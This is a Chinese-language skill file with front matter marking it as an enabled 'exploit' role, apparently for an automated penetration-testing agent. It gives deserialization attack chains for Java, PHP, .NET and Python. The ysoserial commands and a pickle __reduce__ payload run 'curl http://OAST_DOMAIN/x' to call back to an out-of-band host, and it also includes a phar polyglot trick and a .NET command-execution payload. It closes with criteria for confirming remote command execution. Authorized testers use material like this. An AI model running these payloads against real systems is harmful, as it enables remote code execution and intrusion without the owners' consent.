---
name: deserialize
description: 反序列化四条链：Java(ysoserial)/PHP(phar/pickle)/.NET(ysoserial.net)/Python(pickle)，含探测判据与回连验证
whenToUse: 看到 base64 的 Java 序列化头 rO0AB、PHP unserialize、.NET ViewState、Python pickle，或端点报反序列化异常
role: exploit
enabled: true
---

# 反序列化

## 先识别

~~~
Java：base64 开头 rO0AB / hex 开头 aced0005
PHP：O:8:\"stdClass\":...  或 phar:// 触发
.NET：__VIEWSTATE / __EVENTVALIDATION 表单字段
Python：\\x80\\x04\\x95 开头的 pickle
~~~

## Java

~~~bash
java -jar ysoserial.jar CommonsCollections6 'curl http://OAST_DOMAIN/x' > payload.bin
base64 -w0 payload.bin
# 探测先用 URLDNS：不执行命令，只发 DNS
java -jar ysoserial.jar URLDNS http://OAST_DOMAIN > u.bin
~~~

判据：URLDNS 有 OAST 回连 = 入口存在；再换 CC6 执行命令。**别一上来就 CC1**，JDK/依赖不匹配会静默失败。

## PHP

~~~php
// 常见入口：__destruct / __wakeup / __toString
// phar 触发（文件操作即触发，不需要 unserialize）
$p = new Phar('evil.phar');
$p['x'] = 'payload';
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
// 上传后让服务端 file_exists('phar://evil.jpg/x')
~~~

## .NET

~~~powershell
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc" -o base64
~~~

## Python

~~~python
import pickle, os
class E:
    def __reduce__(self):
        return (os.system, ('curl http://OAST_DOMAIN/x',))
pickle.dumps(E())
~~~

## 判据

- 有 OAST 回连 = 入口真实；能看到回显或目标侧副作用 = 命令执行
- 落库 category=deserialization，evidence 贴 payload base64 前缀 + 回连时间
- 链强依赖目标依赖版本，**先指纹再选链**，失败是常态，别在一个链上死磕